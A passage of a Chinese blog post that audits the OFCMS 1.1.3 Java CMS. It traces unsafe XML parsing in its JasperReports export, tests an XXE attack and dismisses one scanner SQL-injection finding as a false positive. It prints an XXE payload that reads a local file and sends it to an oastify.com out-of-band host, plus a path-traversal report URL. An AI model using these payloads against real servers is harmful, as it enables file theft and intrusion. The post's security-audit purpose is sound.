file.getPath());<br>		 <span class="hljs-type">OutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>		<span class="hljs-keyword">try</span> &#123;<br>			<span class="hljs-type">DataSource</span> <span class="hljs-variable">dataSource</span> <span class="hljs-operator">=</span> (DataSource) SysBeans<br>					.getBean(<span class="hljs-string">&quot;dataSourceProxy&quot;</span>);<br>			<span class="hljs-type">JasperPrint</span> <span class="hljs-variable">jprint</span> <span class="hljs-operator">=</span> (JasperPrint) JasperFillManager.fillReport(<br>					JasperCompileManager<br>							.compileReport(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file)), hm,<br>					dataSource.getConnection());<br>			<span class="hljs-type">JRXlsExporter</span> <span class="hljs-variable">exporter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JRXlsExporter</span>();<br>			response.setHeader(<span class="hljs-string">&quot;Content-Disposition&quot;</span>, <span class="hljs-string">&quot;attachment;filename=&quot;</span><br>					+ URLEncoder.encode(fileName, <span class="hljs-string">&quot;utf-8&quot;</span>) + <span class="hljs-string">&quot;.xls&quot;</span>);<br>			response.setContentType(<span class="hljs-string">&quot;application/xls&quot;</span>);<br>			response.setCharacterEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>			JasperReportsUtils.render(exporter, jprint,<br>					response.getOutputStream());<br>			response.setStatus(HttpServletResponse.SC_OK);<br>			 out=response.getOutputStream();<br>			 out.flush();<br>	         out.close();<br>		&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>			e.printStackTrace();<br>		&#125;<span class="hljs-keyword">finally</span>&#123;<br>			<span class="hljs-keyword">try</span> &#123;<br>				out.close();<br>			&#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>				e.printStackTrace();<br>			&#125;<br>		&#125;<br></code></pre></td></tr></table></figure>
+
+<p>分析代码后找到了一段比较关键的代码</p>
+<p>填充并生成报表</p>
+<p>先使用 <code>JasperCompileManager</code> 编译 <code>.jrxml</code> 文件；</p>
+<p>然后用参数 <code>hm</code> 和数据库连接填充报表内容，生成 <code>JasperPrint</code> 对象（代表报表数据结构）。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">JasperPrint</span> <span class="hljs-variable">jprint</span> <span class="hljs-operator">=</span> (JasperPrint) JasperFillManager.fillReport(<br>    JasperCompileManager.compileReport(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file)),<br>    hm,<br>    dataSource.getConnection());<br></code></pre></td></tr></table></figure>
+
+<p>此段代码可能对文件内容有控制</p>
+<p>跟进compileReport函数</p>
+<p>compileReport-&gt;compile-&gt;JRXmlLoader.load-&gt;xmlLoader.loadXML-&gt;digester.parse(反序列化)</p>
+<p>compile方法</p>
+<p><img src="/img/ofcms/ofcms22.png" srcset="/img/loading.gif" lazyload></p>
+<p>xmlLoader.loadXML</p>
+<p>此方法主要是将 <code>.jrxml</code> 报表模板文件从 InputStream 中读取，使用 SAX 解析方式转换为 JasperDesign 报表设计对象<img src="/img/ofcms/ofcms23.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到代码中并没有禁用外部实体</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 不支持外部实体</span><br>xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, <span class="hljs-literal">false</span>);<br><span class="hljs-comment">// 不支持dtd</span><br>xif.setProperty(XMLInputFactory.SUPPORT_DTD, <span class="hljs-literal">false</span>);<br></code></pre></td></tr></table></figure>
+
+<p>开始测试</p>
+<p>利用前面发现的文件上传漏洞上传一个jrxml为后缀的文件</p>
+<p>文件内容</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///E:/1.txt&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">eval</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#x27;http://3qu6uz9jay9cbyrfh9d0wtxmndt4h25r.oastify.com/?x=%file;&#x27;&gt;&quot;</span>&gt;</span><br>%eval;<br>%exfil;<br><br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">abc</span> [ <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://127.0.0.1:7777&quot;</span>&gt;</span>&amp;xxe; ]&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>看到成功上传</p>
+<p><img src="/img/ofcms/ofcms24.png" srcset="/img/loading.gif" lazyload></p>
+<p>访问url</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://localhost:8080/ofcms_admin_war/admin/reprot/expReport.html?j=../../static/1<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/ofcms/ofcms25.png" srcset="/img/loading.gif" lazyload></p>
+<p>但是换了很多dns平台都没有访问记录，不知道为什么</p>
+<h4 id="参数未过滤-误报"><a href="#参数未过滤-误报" class="headerlink" title="参数未过滤(误报)"></a>参数未过滤(误报)</h4><p>ofcms-admin&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;ofsoft&#x2F;cms&#x2F;admin&#x2F;controller&#x2F;cms&#x2F;ContentController.java</p>
+<p>第二条关于sql注入漏洞的代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span> &#123;<br>        List&lt;Record&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;Record&gt;();<br>        Map&lt;String, Object&gt; params = getParamsMap();<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//修改内容</span><br>            <span class="hljs-type">Record</span> <span class="hljs-variable">record</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Record</span>();<br>            record.set(<span class="hljs-string">&quot;title_name&quot;</span>, params.get(<span class="hljs-string">&quot;title_name&quot;</span>));<br>            record.set(<span class="hljs-string">&quot;content_id&quot;</span>, params.get(<span class="hljs-string">&quot;content_id&quot;</span>));<br>            Db.update(<span class="hljs-string">&quot;of_cms_content&quot;</span>, <span class="hljs-string">&quot;content_id&quot;</span>,record);<br>            <span class="hljs-comment">//组装参数</span><br>            <span class="hljs-keyword">for</span> (String key : params.keySet()) &#123;<br>                list.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Record</span>().set(<span class="hljs-string">&quot;name&quot;</span>,key).set(<span class="hljs-string">&quot;value&quot;</span>, params.get(key).toString()).set(<span class="hljs-string">&quot;content_id&quot;</span>, params.get(<span class="hljs-string">&quot;content_id&quot;</span>)));<br>            &#125;<br>            <span class="hljs-comment">//批量修改</span><br>            Db.batchUpdate(<span class="hljs-string">&quot;of_cms_content_field&quot;</span>,<span class="hljs-string">&quot;content_id,name&quot;</span>,list, list.size());<br><br>            rendSuccessJson();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>            rendFailedJson(ErrorCode.get(<span class="hljs-string">&quot;9999&quot;</span>));<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>扫描呈现出此代码有漏洞的原因是工具中程序认定params中参数未过滤，但是实际通过此参数无法注入恶意数据完成字符串拼接</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol>
+<li>java代码审计工具初始配置下不如php完善，很多漏洞需要手动查找(准备多换几个工具试试)</li>
+<li>要黑白盒结合审计，在网站寻找功能点再对应源码测试</li>
+<li>手动搜索特殊函数与关键字对搜索结果做筛选找漏洞</li>
+</ol>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="category-chain-item">Java代码审计</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="print-no-link">#Java代码审计</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>OFCMS 1.1.3 代码审计(Java)</div>
+      <div>http://huang-d1.github.io/2025/07/13/OFCMS 1.1.3 代码审计(Java)/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>huangdi</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年7月13日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/07/13/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B8%AD%E7%9A%84XXE/" title="Java代码审计中的XXE">
+                        <span class="hidden-mobile">Java代码审计中的XXE</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://Hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://huang-d1.github.io" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
